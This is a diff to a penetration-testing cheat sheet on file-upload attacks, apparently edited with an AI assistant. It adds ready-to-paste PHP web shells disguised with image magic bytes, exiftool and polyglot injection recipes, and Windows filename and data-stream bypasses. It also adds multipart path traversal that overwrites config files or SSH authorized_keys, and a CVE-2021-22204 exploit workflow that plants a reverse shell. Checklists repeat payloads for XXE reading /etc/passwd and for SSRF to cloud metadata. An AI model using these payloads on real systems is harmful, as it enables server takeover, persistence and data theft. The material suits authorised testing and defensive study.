@@ -283,6 +283,19 @@ Fuzz with generated list:
 ffuf -u http://target.com/upload.php -X POST -F "file=@shell.FUZZ;type=image/jpeg" -w upload_wordlist.txt -mc 200 -fs <blocked_size>
 ```
 
+### Windows Filename Quirks (IIS / .NET)
+
+Windows silently drops **trailing dots and spaces** from filenames, and NTFS supports **alternate data streams** — both defeat filters that validated the *submitted* name but let the OS decide the *stored* name:
+
+```text
+shell.aspx.         → saved as shell.aspx   (trailing dot stripped)
+shell.aspx<space>   → saved as shell.aspx   (trailing space stripped)
+shell.aspx::$DATA   → writes the default data stream → lands as shell.aspx
+shell.asp;.jpg      → legacy IIS 6 semicolon parse bug → executes as shell.asp
+```
+
+> [!tip] Combine with case (`shell.AspX.`) — some filters lowercase *or* trim, rarely both.
+
 ### .htaccess Upload (Apache)
 
 If `.htaccess` can be uploaded, force Apache to execute a custom extension as PHP:
@@ -352,41 +365,88 @@ ffuf -u http://target.com/upload.php -X POST -F "file=@shell.php;type=FUZZ" -w i
 
 ## MIME-Type Bypass (Magic Bytes)
 
-Server reads actual file content to determine type. Prepend magic bytes to fool it.
+Server reads the actual file **content** (via libmagic/`finfo`, PHP `getimagesize()`, or an image library) to determine type. Prepend the target format's **magic bytes** so the file sniffs as an image while still running as code.
 
-| Format | Magic bytes (text) | Hex |
+> [!tip] **Why prepending works for RCE, not just for passing the check** — the PHP interpreter ignores everything before the first `<?php` tag, so `GIF89a\n<?php system($_GET['cmd']); ?>` sniffs as a GIF **and** executes as PHP. The magic bytes are inert leading noise to the language but a valid header to the type check. (Same idea for any interpreter that scans for its own opening tag.)
+
+### Step 0 — which check is the server doing? (this decides how many bytes you need)
+
+| Check | What satisfies it | Bytes required |
 |---|---|---|
-| GIF | `GIF8` | `47 49 46 38` |
-| PNG | `\x89PNG` | `89 50 4E 47` |
-| JPG | `\xff\xd8\xff` | `FF D8 FF` |
-| PDF | `%PDF` | `25 50 44 46` |
+| `file` / libmagic / PHP `finfo` | a recognisable **signature** | a few bytes (table below) |
+| PHP `getimagesize()` / image libraries | a header it can read **dimensions** from | a structurally-valid header |
 
-### Add magic bytes to PHP shell
+`getimagesize()` is the stricter of the two — a bare signature is often **not** enough. When unsure, start from a **real tiny image** and inject into it (exiftool / `cat`), which satisfies both.
+
+### Signature reference (all verified against `file`)
+
+| Format | Prefix (ASCII) | Hex | `file` detects from | Passes `getimagesize()`? |
+|---|---|---|---|---|
+| **GIF** ✅ best default | `GIF89a` (also `GIF87a`, `GIF8`) | `47 49 46 38 39 61` | 4 bytes (`GIF8`) | ✔ with `GIF89a` |
+| PNG | `\x89PNG\r\n\x1a\n` **+ IHDR chunk** | `89 50 4E 47 0D 0A 1A 0A` | needs IHDR chunk — **not** the 8-byte sig alone | ✔ only with IHDR |
+| JPEG | `\xff\xd8\xff\xe0` (or `…\xe1`) | `FF D8 FF E0` | **4 bytes** — `FF D8 FF` alone is *not* enough | ✖ needs a full frame |
+| PDF | `%PDF-` | `25 50 44 46 2D` | 5 bytes | n/a |
+| BMP | `BM` + size fields | `42 4D` | needs size fields, not `BM` alone | ✔ with header |
+| WebP | `RIFF????WEBP` | `52 49 46 46 … 57 45 42 50` | 12 bytes | ✔ |
+| ZIP / DOCX / JAR | `PK\x03\x04` | `50 4B 03 04` | 4 bytes | n/a |
+
+> [!warning] **Two mistakes to avoid** — `printf '\xff\xd8\xff' > shell.php` does **not** make `file` call it a JPEG (it reports `ISO-8859 text`); JPEG needs the 4th byte (`\xe0`/`\xe1`). And the bare 8-byte PNG signature is likewise **not** detected as PNG — it needs an `IHDR` chunk. Default to `GIF89a` (shortest reliable prefix) or inject into a real image.
+
+### Ready-to-paste recipes
 
 ```bash
-# Prepend GIF magic bytes — server detects as GIF, executes as PHP
-echo 'GIF8' > shell.php.gif
-echo '<?php system($_GET["cmd"]); ?>' >> shell.php.gif
+# GIF — shortest reliable bypass; passes file AND getimagesize()
+printf 'GIF89a\n' > shell.php && echo '<?php system($_GET["cmd"]); ?>' >> shell.php
 
-# Or with printf for hex bytes
-printf '\xff\xd8\xff' > shell.php
+# JPEG — need the 4th byte; 3 bytes ('\xff\xd8\xff') is NOT enough for `file`
+printf '\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01' > shell.php
 echo '<?php system($_GET["cmd"]); ?>' >> shell.php
+
+# PDF
+printf '%%PDF-1.5\n' > shell.php && echo '<?php system($_GET["cmd"]); ?>' >> shell.php
+
+# Robust (beats getimagesize() + finfo): inject into a REAL image so it stays a valid image
+exiftool -Comment='<?php system($_GET["cmd"]); ?>' real.jpg -o shell.php.jpg
+#  or append your PHP after a genuine image (polyglot) — real header, real dimensions:
+cat real.gif shell.php > shell.gif
 ```
 
-### Check what file reports
+### Hex-editing the header (patch bytes in place)
+
+`printf`/`cat` **prepend** — fine when extra leading bytes are harmless (GIF + PHP). Reach for a hex editor when you must instead **overwrite bytes in place without changing the file length**: a format whose header stores internal offsets (prepending shifts everything and corrupts it), fixing a single rejected/wrong header byte on a file you want to keep intact, or injecting into a specific marker of a *real* image the server will re-parse (e.g. the JPEG comment segment `FF FE`, which survives some re-encoding that a trailing append does not).
+
+**Easiest for upload attacks — Burp's Hex tab.** Intercept the upload, switch the message editor to **Hex**, edit the file's raw bytes right in the request (fix the magic number, drop a payload into a marker), and forward. No local files, no re-upload dance.
+
+**CLI, always present — `xxd` round-trip** (length-preserving; `hexedit`/`bless`/`ghex`/ImHex aren't on a default Kali — `apt install hexedit` if you want the interactive one):
 
 ```bash
-file shell.php     # "PHP script text"
-file shell.php.gif # "GIF image data" (after adding magic bytes)
+xxd shell.php > shell.hex                 # dump to editable hex
+#   edit offset 0 in $EDITOR: set the first bytes to the target signature,
+#   e.g. turn '5858 5858 5858' into GIF89a → '4749 4638 3961'
+xxd -r shell.hex > shell.php              # rebuild — byte count is unchanged
+
+# non-interactive same edit (patch offset 0 to GIF89a), verified length-preserving:
+xxd shell.php | sed 's/^00000000: 5858 5858 5858/00000000: 4749 4638 3961/' | xxd -r > out.php
+file -b out.php                           # => "GIF image data, version 89a"
 ```
 
-### Add to image using exiftool
+> [!tip] Magic bytes live at **offset 0** — patch the very first line of the dump. To embed a payload *inside* a genuine JPEG instead, find the `FF FE` comment marker (`xxd real.jpg | grep -n 'fffe'`), and write your bytes into that segment so the surrounding image structure — and its real dimensions for `getimagesize()` — stays intact.
+
+### Confirm BEFORE you upload
 
 ```bash
-# Inject PHP into EXIF comment of a real image
+file shell.php                                     # want "GIF image data" / "JPEG image data" / etc.
+php -r 'var_dump(getimagesize("shell.php"));'      # non-false => passes getimagesize()
+xxd shell.php | head -2                             # eyeball the leading bytes
+```
+
+### Inject a payload into a real image (exiftool)
+
+```bash
+# PHP into EXIF comment of a real image (survives getimagesize + finfo)
 exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg -o shell.jpg
 
-# Inject XSS payload
+# XSS into EXIF comment (fires if the metadata is later reflected as HTML)
 exiftool -Comment=' "><img src=1 onerror=alert(window.origin)>' HTB.jpg
 ```
 
@@ -472,8 +532,8 @@ Valid in multiple formats — bypasses both extension and MIME validation.
 
 ```bash
 # Create a JPG+PHP polyglot
-# Method 1: prepend magic bytes to PHP
-printf '\xff\xd8\xff' > polyglot.php
+# Method 1: prepend JPEG magic bytes (need the 4th byte — see Magic Bytes section)
+printf '\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01' > polyglot.php
 cat shell.php >> polyglot.php
 
 # Method 2: use exiftool to embed PHP in a real JPG
@@ -558,6 +618,24 @@ Workflow:
 3. Engine.openGate() fires all requests at once
 4. If execution response arrives before deletion → RCE
 ```
+
+---
+
+## Filename Path Traversal (Direct)
+
+Separate from Zip Slip — the multipart `filename` field **itself** can carry traversal. Naive handlers do `save(upload_dir + filename)`, so `../` in the name escapes the upload directory or overwrites an existing file. No archive needed.
+
+```text
+# In Burp, edit the Content-Disposition filename:
+Content-Disposition: form-data; name="file"; filename="../../../../var/www/html/shell.php"
+
+# Escape a locked-down uploads dir into the web root, or overwrite a known file:
+filename="../config.php"                 → overwrite app config
+filename="../../.ssh/authorized_keys"    → SSH persistence (if the worker can write there)
+filename="....//....//shell.php"         → defeat a single-pass `../` stripper
+```
+
+> [!warning] Overwriting live files is destructive and can break the app — prefer escaping *into* a new path (RCE) over clobbering an existing one; on real engagements confirm the target and keep the original. Pairs with the archive form below ([[#Zip Slip (Path Traversal via Archive)]]).
 
 ---
 
@@ -679,6 +757,22 @@ curl -s -X POST http://<TARGET>/upload -F "file=@exploit.eps"
 > [!tip] Rename to `.jpg`/`.png` if the upload filter only checks the extension — ImageMagick sniffs content, so it will still route the file to the Ghostscript delegate. This is why an "images only" whitelist does not close this off.
 
 > [!warning] Patched in Ghostscript 10.01.2 (July 2023). Version-check first via an error message or `identify -version` output if you can reach it — blind attempts are noisy and write to the target's logs.
+
+### ExifTool RCE via Metadata Parsing (CVE-2021-22204)
+
+Many apps run **exiftool** on uploads to *strip* metadata — so the tool meant to sanitise your file is the one that executes it. ExifTool 7.44–12.23 evals attacker-controlled DjVu annotation metadata: a crafted image (commonly a `.jpg` carrying an embedded DjVu `ANT` chunk) injects Perl that runs the instant exiftool parses it. This is the bug that gave RCE on GitLab uploads.
+
+```bash
+git clone https://github.com/convisolabs/CVE-2021-22204-exiftool
+cd CVE-2021-22204-exiftool
+# edit the reverse-shell payload (IP/port) in exploit.py, then:
+python3 exploit.py                    # produces image.jpg
+# Upload image.jpg — fires the moment the server runs exiftool on it
+```
+
+> [!tip] This closes the loop with the two above: **ImageMagick, Ghostscript, and exiftool** are the three upload-processing tools a "safe" pipeline commonly runs on your file — an images-only whitelist does not protect any of them, because they sniff content. If uploads are accepted but never executed as web pages, test all three before concluding the endpoint is inert.
+
+> [!warning] Patched in ExifTool 12.24 (Apr 2021). `exiftool -ver` on the target (or a version banner in an error) tells you where it sits — the injection is silent, so version-check rather than spray.
 
 ---
 
@@ -813,12 +907,14 @@ url=http://<collaborator-url>/test
 [ ] Fuzz extensions with web-extensions.txt (blacklist bypass)
 [ ] Try case sensitivity: shell.PHP, shell.Php, shell.pHp
 [ ] Try double extension: shell.jpg.php, shell.php.jpg
+[ ] Windows target? → trailing dot/space (shell.aspx. / shell.aspx␠), ADS (shell.aspx::$DATA), IIS6 semicolon (shell.asp;.jpg)
 [ ] Try null byte: shell.php%00.jpg
 [ ] Try filename length truncation: shell.php + 242xA + .jpg (= 255 total)
 [ ] Generate char injection wordlist and fuzz
 [ ] Change Content-Type to image/jpeg — fuzz full list
-[ ] Add GIF8 magic bytes — check if MIME filter bypassed
+[ ] Add magic bytes — GIF89a (reliable; passes file + getimagesize); confirm with `file` before upload
 [ ] Inject PHP into real image via exiftool (polyglot)
+[ ] Traversal in the multipart filename itself (../../shell.php) — escape upload dir / overwrite
 [ ] Try .htaccess upload (Apache) / web.config (IIS)
 [ ] Discover upload path if not disclosed
 [ ] Try LFI+upload chain if LFI exists
@@ -827,6 +923,7 @@ url=http://<collaborator-url>/test
 [ ] Race condition if validation window exists
 [ ] Zip/tar upload? → test Zip Slip path traversal
 [ ] Image processing on server? → test ImageTragick (MVG/SVG), CVE-2022-44268 (PNG file read), CVE-2023-36664 (EPS → Ghostscript RCE)
+[ ] Metadata stripped with exiftool? → CVE-2021-22204 (DjVu-in-JPEG → RCE, ExifTool ≤12.23)
 [ ] Processed image returned to you? → required for the CVE-2022-44268 read-back
 [ ] Template files accepted? → test SSTI ({{7*7}}, ${7*7})
 [ ] Upload-from-URL field? → test SSRF (127.0.0.1, metadata, file://)
@@ -842,9 +939,11 @@ url=http://<collaborator-url>/test
 | Blacklist bypass — alt extensions | `.pht .phar .phtm .phtml` (confirm handler config; `.phps` is source-display, not exec) |
 | Double extension | `shell.php.jpg` (executes on first ext) or `shell.jpg.php` |
 | Null byte truncation (legacy) | `shell.php%00.jpg` |
+| Windows trailing-dot / ADS | `shell.aspx.` or `shell.aspx::$DATA` → stored as `shell.aspx` |
 | Fuzz extensions | `ffuf -u http://target.com/upload.php -X POST -F "file=@shell.FUZZ;type=image/jpeg" -w web-extensions.txt -mc 200` |
 | Content-Type bypass | Change `Content-Type: application/x-php` → `image/jpeg` in Burp |
-| MIME/magic-byte bypass | `printf '\xff\xd8\xff' > shell.php; echo '<?php system($_GET["cmd"]); ?>' >> shell.php` |
+| MIME/magic-byte bypass (reliable) | `printf 'GIF89a\n' > shell.php; echo '<?php system($_GET["cmd"]); ?>' >> shell.php` (JPEG needs `\xff\xd8\xff\xe0`, not 3 bytes) |
+| Hex-edit header in place (length-preserving) | Burp **Hex** tab on the upload, or `xxd f > f.hex` → edit offset 0 → `xxd -r f.hex > f` |
 | EXIF-embedded payload | `exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg -o shell.jpg` |
 | .htaccess upload (Apache) | Upload `.htaccess` with `AddType application/x-httpd-php .jpg` |
 | Polyglot JPG+PHP | `cat real.jpg shell.php > polyglot.php` |
@@ -852,14 +951,16 @@ url=http://<collaborator-url>/test
 | LFI + upload chain | Upload `shell.php.jpg` → `?file=../uploads/shell.php.jpg&cmd=id` |
 | SVG XXE | `<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>` |
 | Stored XSS via filename | `"><img src=x onerror=alert(window.origin)>.jpg` |
+| Filename path traversal (direct) | `filename="../../../var/www/html/shell.php"` in the multipart part |
 | Zip Slip path traversal | `python3 evilarc/evilarc.py shell.php -o unix -d 6 -p var/www/html/ -f evil.zip` |
 | ImageMagick PNG file read (CVE-2022-44268) | `python3 CVE-2022-44268.py /etc/passwd` → upload → `identify -verbose out.png` → `xxd -r -p` |
 | Ghostscript RCE via ImageMagick (CVE-2023-36664) | `python3 CVE_2023_36664_exploit.py --generate --payload "<cmd>" --filename exploit.eps` |
+| ExifTool RCE (CVE-2021-22204) | convisolabs PoC → crafted DjVu-in-JPEG → RCE when server runs exiftool (≤12.23) |
 | SSTI probe (post-upload template render) | `{{7*7}}` (Jinja2/Twig) or `${7*7}` (Freemarker/Mako) |
 | Upload-from-URL SSRF | `url=http://169.254.169.254/latest/meta-data/` |
 
 ---
 
 *Created: 2026-03-02*
-*Updated: 2026-07-30*
+*Updated: 2026-09-01*
 *Model: claude-opus-5*
